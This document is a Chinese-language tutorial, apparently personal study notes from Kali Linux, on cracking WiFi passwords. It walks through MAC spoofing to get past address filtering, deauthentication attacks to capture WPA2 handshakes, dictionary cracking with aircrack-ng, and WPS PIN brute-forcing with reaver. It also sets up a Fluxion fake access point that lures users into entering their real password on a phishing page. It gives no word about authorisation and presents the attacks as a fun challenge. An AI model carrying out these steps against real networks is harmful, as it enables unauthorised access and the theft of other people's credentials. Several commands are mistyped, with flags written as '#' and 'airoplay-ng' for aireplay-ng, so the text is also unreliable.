## 无线网络安全, 破解WiFi密码

- [无线网络安全, 破解WiFi密码](#无线网络安全-破解wifi密码)
  - [1.Aircrack-ng套件](#1aircrack-ng套件)
    - [1.1.连接MAC地址绑定的wifi](#11连接mac地址绑定的wifi)
    - [1.2.WPA2加密的wifi](#12wpa2加密的wifi)
    - [1.3.WEP加密的wifi](#13wep加密的wifi)
  - [2.路由器的PIN码破解](#2路由器的pin码破解)
  - [3.Fluxion工具(推荐)](#3fluxion工具推荐)

> !阅前须知!  
>> 本文是基于我很久以前学习网络基础时的笔记,  
>> 文中的工具可能已经过时, 或者使用方法已经改变了, 感兴趣可以自行深入查阅资料.  

```ps.本文环境在Kali下, 学习最好具备一点Linux基础知识.```  
```ps.本文中的'混杂模式'并不是所有网卡都支持, 详请搜索支持网卡型号.```  
```ps.本文第一节和第二节的方法受限于硬件配置等因素, 破解时间过长也是合理的.```  

### 1.Aircrack-ng套件

非常优秀的无线网络分析套件, 功能强大.  
许多安全软件套件都默认(添加/调用)此套件来完成操作.  

```bash
# 首先, 先要切换到能够支持'混杂模式'的网卡(一般都是购买USB无线网卡)
# 开启混杂模式(开启之后, 网卡名可能会改变)
> ifconfig (网卡名) down
> iwconfig (网卡名) mode monitor
> ifconfig (网卡名) up
```

#### 1.1.连接MAC地址绑定的wifi

```bash
# 查看附件网络中的wifi, 并观察其详细信息(channel、BSSID(MAC)等)
> airodump-ng (网卡名)

# 得知详细信息后, 可以停止查看(control + c / ctrl + c)
# 开始拿有效的mac地址信息(尽量等久点, 包多点)
> airodump-ng -c (信道channel) # bssid (BSSID(MAC) (网卡名)

# 拿到有效mac地址(不要拿到路由器的mac)
# 修改本机mac
> ifconfig (网卡名) down
> macchanger -m (MAC地址) (网卡名)
> ifconfig (网卡名) up

# 注意, 此方法拿到有效mac地址, 并未拿到wifi密码
```

#### 1.2.WPA2加密的wifi

```bash
# 查看附件网络中的wifi, 并观察其详细信息(channel、BSSID(MAC)等)
> airodump-ng (网卡名)

# 得知详细信息后, 可以停止查看(ctrl+c)
# 开始进行查看route与client的mac地址, [-w]选项的意思就是write
> airodump-ng -w wpa -c (信道channel) # bssid (BSSID(MAC) (网卡名) # ignore-negative-one

# 查看route与client的mac地址
# 开始获得握手包.cap
> airoplay-ng # deauth 10 -a (route的mac) -c (client的mac) (网卡名) # ignore-negative-one

# 对握手包.cap进行破解
aircrack-ng -w (指定字典) (cap握手包名)

# 字典可以自己制作(Crunch工具), 也可以在网上下载大神的字典
# 一个NB的字典, 对你的破解!事半功倍!
```

#### 1.3.WEP加密的wifi

```bash
# 由于这种加密基本已经舍弃了, 就不说了
```

### 2.路由器的PIN码破解

通过输入`PIN码`来连接wifi也是可以的, PIN码的破解也是一种不错的方法.  
常见的工具有`reaver`、`minidwep-gtk`等工具, 这里我就说下`reaver`工具.  

```bash
# 首先, 先要切换到能够支持'混杂模式'的网卡(一般都是购买USB无线网卡)
# 开启混杂模式(开启之后, 网卡名可能会改变)
> ifconfig (网卡名) down
> iwconfig (网卡名) mode monitor
> ifconfig (网卡名) up

# 选做:可以尝试扫描是否有启用WPS的wifi
# Wash工具就是一款针对'判断wifi是否启用WPS'的工具

# 查看附件网络中的wifi, 并观察PWR值小于70的来破解(记录BSSID, 记住要是路由器的)
> airodump-ng (网卡名)

# 开始进行破解(注意是路由器的MAC地址, PIN码是针对路由器的)
> reaver -i (网卡名) -b (路由器MAC地址) -a -S -vv

# 1.如果出现 warning fail to associate ...
# 则说明破解失败(失败原因包括对象路由器未开启WPS等)
# 2.提示给出了 PIN码 或 PIN码和PSK密钥(wifi密码)
# 则说明破解成功(记录PIN码)/(使用PSK密钥直接尝试连接wifi)

# 选做:可以尝试得到wifi密码(PIN码是可以连wifi)
> reaver -i (网卡名) -b (路由器MAC地址) -p (刚得到的PIN码)
```


### 3.Fluxion工具(推荐)

一个非常不错的社工破解wifi神器.  

与前面操作思路不同.  
它是通过模拟`原有wifi(FakeAP)`, 用户进行连接,  
然后wifi会断开网络, 并向连接用户发送请求(浏览器跳转页面), 请求输入原wifi密码,  
用户在收到请求后, 只需输入正确密码, wifi就会恢复网络, 而你获得wifi密码,  
注意, `Fluxion`会自动判断wifi密码是否正确, 从而做出下一步操作,  

ps.此方法的好处就是不用耗费资源去破解密码.  
ps.Fluxion运行时需要调用许多其它工具, 部分工具可能需要另行下载(运行时会提示有哪些未下载).  

```bash
# 运行软件(在软件目录下)
> ./fluxion

> 网卡(选择网卡)
> channels(选择所有信道)
> 扫描wifi(扫描到需要的结果时, 按ctrl+c)
> 选择wifi(输入1、2、3等选择)
# 建立一个假AP
> 选择攻击方式(选FakeAP-Hostapd...)
> 选择保存路径(可空格跳过, 则保存在桌面/root/Desktop/)
# 会自动出现窗口
> 握手包选择(aircrack-ng...)
# 抓包分配包
> 数据包分配(Deauth all)

# 若是以上步骤正确完成, 等抓包抓完, 会出现选择
> 选择web interface
> 选择语言(提示用户输入密码时的界面语言)

# 等待用户连接上网, 在浏览器输入正确密码(工具会自动验证密码是否正确), 工具就会自动停止
# 获得wifi正确密码
```

破解wifi可以说是比较有意思、并且有挑战性的一块知识点了,  
更多的无线攻防操作, 其实都是建立在连入局域网的前提之下的.  